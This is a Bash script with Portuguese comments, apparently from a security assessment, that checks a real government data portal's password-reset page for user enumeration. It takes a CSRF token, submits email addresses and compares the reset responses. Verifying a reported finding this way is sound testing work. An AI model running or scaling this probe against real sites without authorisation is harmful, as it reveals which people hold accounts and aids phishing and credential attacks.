#!/bin/bash
# ==============================================================================
# Teste de Vulnerabilidade: Enumeração de Utilizadores (Reset Password)
# Relatório: Devoteam Cyber Trust
# ==============================================================================

# Caminho do diretório do script
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Carregar variáveis de ambiente do ficheiro .env se existir
load_env() {
    local env_file="$1"
    if [ -f "$env_file" ]; then
        while IFS= read -r line || [ -n "$line" ]; do
            # Remover comentários de fim de linha
            line="${line%%#*}"
            # Trim whitespace
            line=$(echo "$line" | xargs)
            [[ -z "$line" ]] && continue
            # Exportar apenas se parecer uma atribuição válida
            if [[ "$line" =~ ^[A-Za-z_][A-Za-z0-9_]*=.*$ ]]; then
                export "$line"
            fi
        done < "$env_file"
    fi
}

load_env "$SCRIPT_DIR/../../../../.env"

# Configurações
# Usamos /pt/reset/ com barra final para evitar o redirect 301
BASE_URL="${BASE_URL:-https://dados.gov.pt}"
TARGET_URL="${BASE_URL%/}/pt/reset/"
RESULTS_FILE="$SCRIPT_DIR/resultados_enumeracao.txt"
> "$RESULTS_FILE"

log() { echo "$1" | tee -a "$RESULTS_FILE"; }

# Função para testar um email
test_email() {
    local email="$1"
    local label="$2"
    
    log "------------------------------------------------------------"
    log "Testando email: $email ($label)"
    
    # 1. Obter CSRF Token e Cookie de Sessão
    local tmp_cookies=$(mktemp)
    local tmp_resp=$(mktemp)
    
    # -i para incluir headers (útil para debug se necessário)
    curl -s -L -k -c "$tmp_cookies" "$TARGET_URL" > "$tmp_resp"
    
    # Extração robusta do CSRF token
    local csrf_token=$(grep -o 'name="csrf_token" value="[^"]*"' "$tmp_resp" | head -1 | cut -d'"' -f4)
    
    if [ -z "$csrf_token" ]; then
        # Tentar outro formato comum
        csrf_token=$(grep 'csrf_token' "$tmp_resp" | sed -n 's/.*value="\([^"]*\)".*/\1/p' | head -1)
    fi
    
    if [ -z "$csrf_token" ]; then
        log "  [!] Erro: Não foi possível obter o CSRF token de $TARGET_URL"
        rm "$tmp_cookies" "$tmp_resp"
        return
    fi
    
    # 2. Enviar pedido POST (Simular submissão do formulário)
    # Incluímos o Referer para evitar erro 400 (proteção CSRF do Flask-WTF)
    local response=$(curl -s -L -k -b "$tmp_cookies" \
        -H "Referer: $TARGET_URL" \
        -d "email=$email" \
        -d "csrf_token=$csrf_token" \
        -X POST "$TARGET_URL")
    
    # 3. Analisar a resposta
    # Caso 1: Sucesso (Utilizador existe ou mensagem de sucesso padrão)
    if echo "$response" | grep -q "Instructions to reset your password have been sent"; then
        log "  [+] RESULTADO: Mensagem de SUCESSO detectada."
        log "  → Mensagem: 'Instructions to reset your password have been sent.'"
        
    # Caso 2: Erro (Utilizador não existe ou erro de validação)
    elif echo "$response" | grep -q "Invalid credentials" || echo "$response" | grep -q "Invalid email address"; then
        log "  [-] RESULTADO: Mensagem de ERRO detectada."
        log "  → Mensagem: 'Invalid credentials' ou similar."
    else
        log "  [?] RESULTADO: Resposta desconhecida. Verificar manualmente."
        local debug_file="$SCRIPT_DIR/resposta_$(date +%s).html"
        echo "$response" > "$debug_file"
        log "  → Resposta salva em: $debug_file para análise."
    fi
    
    rm "$tmp_cookies" "$tmp_resp"
}

log "============================================================"
log " TESTE DE ENUMERAÇÃO DE UTILIZADORES"
log " Alvo: $TARGET_URL"
log "============================================================"
log ""

# 1. Testar um email que garantidamente não existe
RANDOM_EMAIL="nonexistent_user_$(date +%s)@example.com"
test_email "$RANDOM_EMAIL" "Email Inexistente"

# 2. Testar email fornecido pelo utilizador (se houver)
if [ -n "$1" ]; then
    test_email "$1" "Email Fornecido/Teste"
fi

log ""
log "============================================================"
log " Fim dos testes. Resultados em: $RESULTS_FILE"
log "============================================================"
